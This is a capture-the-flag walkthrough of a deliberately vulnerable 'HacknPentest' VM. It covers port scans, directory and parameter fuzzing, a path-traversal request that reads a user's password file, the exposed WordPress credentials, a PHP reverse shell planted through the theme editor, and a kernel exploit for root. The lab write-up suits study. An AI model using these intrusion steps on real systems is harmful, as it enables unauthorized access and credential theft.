*By Praveen Kumar Sharma*

<hr>

For me the IP of the machine is : **192.168.110.118**

Lets try pinging it :

![[Pasted image 20240808002313.png]]

Its online !!

<hr>

### Port Scanning : 

#### All Port Scan : 

```
nmap -p- -n -Pn --min-rate=10000 -T5 192.168.110.118 -o allPortScan.txt
```

![[Pasted image 20240808002350.png]]

>[!Open Ports] 
>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Lets try a deeper scan :

#### Deeper Scan : 

```
nmap -sC -sV -A -T5 -p 22,80 192.168.110.118 -o deeperScan.txt
```

![[Pasted image 20240808002546.png]]

>[!Deeper Scan] 
>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

We do have this web application on port 80 lets try directory fuzzing 

<hr>

### Directory Fuzzing 

```
gobuster dir -u 192.168.110.118 -w /usr/share/wordlists/dirb/common.txt -x .txt,.php -o directories.txt
```

![[Pasted image 20240808002908.png]]

>[!Directories]
>/dev                  (Status: 200) [Size: 131]
/image.php            (Status: 200) [Size: 147]
/index.php            (Status: 200) [Size: 136]
/index.php            (Status: 200) [Size: 136]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.110.118/javascript/]
/secret.txt           (Status: 200) [Size: 412]
/wordpress            (Status: 301) [Size: 322] [--> http://192.168.110.118/wordpress/]

Lets see this web application 

<hr>

### Web Application : 

![[Pasted image 20240808003110.png]]

Nothing in the source code either lets see the /dev here

![[Pasted image 20240808003137.png]]

Progress i Guess?

Lets try /image.php

![[Pasted image 20240808003241.png]]

Nothing here too also the /index.php is exactly same to image.php

![[Pasted image 20240808003337.png]]

Lets see the /wordpress before /secret.txt 


![[Pasted image 20240808003425.png]]

A login page here 

![[Pasted image 20240808003444.png]]

username and password doesnt seem to be admin and admin or password etc
did enumerate the name victor from booting the machine in the vm like this 

![[Pasted image 20240808003602.png]]
another thing here if we login as guest 

![[Pasted image 20240808003806.png]]

Lets checkout the /secret.txt here 

![[Pasted image 20240808003836.png]]

Lets see this link 

on this github page 

![[Pasted image 20240808003940.png]]

Lets try running this, didnt work correctly for me had to modify it a little bit 

```
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 500 http://192.168.110.118/index.php?FUZZ=something | grep -v "136"
```

![[Pasted image 20240808004322.png]]

so /index.php?file=location.txt as they mentioned 

![[Pasted image 20240808004446.png]]

So the other php we have is image.php lets try on there 

It worked 

![[Pasted image 20240808004606.png]]

As it mentioned it had password.txt on its home directory 

it type this in btw (we enumerate saket from guest session too)

```
http://192.168.110.118/image.php?secrettier360=../../../home/saket/password.txt
```

![[Pasted image 20240808004853.png]]

>[!Admin Login Creds]
>Username : victor
>Password : follow_the_ippsec

Lets try logging in and we can btw 

<hr>

### Gaining Access 

![[Pasted image 20240808005059.png]]

Lets get a reverse shell go in Appearance -> Theme Editor -> secret.php

![[Pasted image 20240808005156.png]]

Lets get the script from here : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Change these 

![[Pasted image 20240808005343.png]]

copy paste it there then click on update files

![[Pasted image 20240808005552.png]]

Start a netcat listner

![[Pasted image 20240808005800.png]]

now go on this : http://192.168.110.118/wordpress/wp-content/themes/twentynineteen/secret.php

and we get a shell also look at this 

![[Pasted image 20240808005924.png]]

Lets upgrade the shell first 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press ^Z 
then type in 

```
stty raw -echo; fg
```

then press enter once 
then type in 

```
export TERM=xterm
```

This one might work for us 

![[Pasted image 20240808010335.png]]

Lets get it like this :

![[Pasted image 20240808010411.png]]

then start a python server on your host from the mahcine to get this file 

![[Pasted image 20240808010523.png]]

Get it like this 

![[Pasted image 20240808010607.png]]

Lets compile it

![[Pasted image 20240808010707.png]]

now run it 

![[Pasted image 20240808010733.png]]

we get root lets get the both the flags 

Here is both the flag :

![[Pasted image 20240808010851.png]]

